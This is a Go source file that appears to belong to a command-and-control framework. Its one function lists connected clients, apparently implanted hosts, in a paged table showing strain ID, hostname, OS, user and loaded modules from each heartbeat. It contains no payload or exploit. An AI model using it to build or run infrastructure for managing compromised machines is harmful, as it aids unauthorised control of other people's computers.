package snippets

import (
	"fmt"
	"strconv"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
)

func CmdL(ctx lib.CommandContext, arg string) (string, error) {
	var (
		page int
		err  error
	)
	if arg == "" {
		page = 0
	} else {
		page, err = strconv.Atoi(arg)
		if err != nil {
			return "", fmt.Errorf("could not parse argument: %s", err.Error())
		}
	}

	clients, err := ctx.State.ClientGetPage(page*lib.DATA_PAGE_SIZE, lib.DATA_PAGE_SIZE)
	if err != nil {
		return "", fmt.Errorf("could not get page from database: %s", err.Error())
	}
	clientsTotalCount, err := ctx.State.ClientCount()
	if err != nil {
		return "", fmt.Errorf("could not get client total count from database: %s", err.Error())
	}
	clientListString := fmt.Sprintf(
		"Client list page %d of %d (%d total client/s; %d per page):\n",
		page,
		clientsTotalCount/lib.DATA_PAGE_SIZE,
		clientsTotalCount,
		lib.DATA_PAGE_SIZE,
	)
	clientListString += "\n| Client Address | Strain ID | Init Time | Hostname | Host OS | Host Arch | HostUser | Host User ID | Modules | Symbols | Errors |"
	clientListString += "\n| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |"
	for _, client := range clients {
		clientListString += fmt.Sprintf(
			"\n| %s | %s | %s | %s | %s | %s | %s | %s | %s | %s | %d |",
			client.Address,
			client.LastHeartbeat.StrainId,
			client.LastHeartbeat.InitTime,
			client.LastHeartbeat.Hostname,
			client.LastHeartbeat.HostOS,
			client.LastHeartbeat.HostArch,
			client.LastHeartbeat.HostUser,
			client.LastHeartbeat.HostUserId,
			client.LastHeartbeat.Modules,
			client.LastHeartbeat.Symbols,
			client.LastHeartbeat.Errors,
		)
	}
	return clientListString, nil
}
